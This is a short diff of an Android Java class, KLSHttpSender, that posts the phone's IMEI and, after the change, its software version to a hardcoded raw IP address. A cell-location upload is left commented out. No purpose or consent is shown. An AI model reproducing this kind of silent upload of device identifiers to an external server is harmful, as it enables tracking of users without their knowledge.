@@ -15,6 +15,9 @@ import org.apache.http.client.methods.HttpPost;
 import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.message.BasicNameValuePair;
 
+import sun.org.mozilla.javascript.internal.Context;
+
+import android.content.Intent;
 import android.telephony.TelephonyManager;
 import android.telephony.gsm.GsmCellLocation;
 import android.util.Log;
@@ -26,11 +29,11 @@ public class KLSHttpSender {
 	TelephonyManager mTelephonyManager;
 	GsmCellLocation mGsmCellLocation;
 	
-	KLSHttpSender() {
+	KLSHttpSender(TelephonyManager tm) {
 		mHttpClient = new DefaultHttpClient();
 		mHttpPost = new HttpPost();
 		mDebugLevel = KLSDebugLog.getDebugLevel();
-		mTelephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+		mTelephonyManager = tm;
 		mGsmCellLocation = (GsmCellLocation) mTelephonyManager.getCellLocation();
 	}
 	
@@ -40,6 +43,8 @@ public class KLSHttpSender {
 			mHttpPost.setURI(new URI("http://109.253.182.246/process.php"));
 		    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
 		    nameValuePairs.add(new BasicNameValuePair("IMEI", mTelephonyManager.getDeviceId()));
+		    nameValuePairs.add(new BasicNameValuePair("Software Version", mTelephonyManager.getDeviceSoftwareVersion()));
+		    //nameValuePairs.add(new BasicNameValuePair("Cell Location", mTelephonyManager.getCellLocation().toString()));
 		    nameValuePairs.add(new BasicNameValuePair("stringdata", "DATADTADATDATTDTTDATDATA"));
 		    mHttpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
 
